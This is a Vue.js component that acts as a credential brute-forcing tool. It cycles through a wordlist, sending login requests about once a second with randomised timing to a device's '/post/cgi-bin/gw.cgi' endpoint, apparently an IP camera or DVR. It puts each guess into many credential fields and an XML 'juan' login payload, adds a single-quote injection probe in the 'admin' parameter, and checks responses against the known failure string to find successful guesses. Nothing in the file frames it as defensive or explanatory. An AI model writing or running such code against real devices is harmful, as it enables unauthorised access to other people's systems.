<template>
  <div>
    <p @click="start">开始</p>
    <p>暂停</p>
  </div>
</template>

<script>
  const key = require('./key.js')
  export default {
    components: {
    },

    data () {
      return {
        usr: 'admin',
        pwd: 'admin',
        time: null
      }
    },
    methods: {
      start: function () {
        let _arr = key.wd
        for (let i = 0; i < _arr.length; i++) {
          // 生成随机数 大约一秒 请求一次
          let _t = Math.ceil(Math.random() * 200) + 900
          setTimeout(() => {
            this.post(_arr[i], _arr[i])
          }, _t * i)
        }
      },
      post: function (usr, pwd) {
        let _this = this
        _this.$request({
          baseURL: '',
          url: '/post/cgi-bin/gw.cgi',
          type: 'GET',
          params: {
            'PORTAL_LANG': 'cn',
            'cmd': 'Login',
            '_CACHE_LOGIN_TIME_': new Date().getTime(),

            admin: `admin'`,
            userid: `${usr}`,
            userName: `${usr}`,
            password: `${pwd}`,
            pwd: `${pwd}`,
            USER_PASSWORD: `${pwd}`,
            xml: `<juan ver="" squ="" dir=""><envload type="0" usr="${usr}" pwd="${pwd}"/></juan>`,
            _: new Date().getTime()
          }
        }).then(res => {
          let str = `<juan ver="" squ="" dir="1" errno="0"><envload errno="4" usr="${usr}" pwd="${pwd}"></envload></juan>`
          if (typeof res === 'string') {
            res = res.replace(/[\r\n\t]/g, '')
          }
          console.log(res)
          if (res !== str) {
            // console.log(`usr="${usr}" pwd="${pwd}"`)
          }
        })
      }
    },
    watch: {
    },
    created: function () {

    },
    mounted () {
      this.$nextTick(() => {
      })
    },
    beforeDestroy () {
    }

  }
</script>

<style lang="less" scoped>

</style>
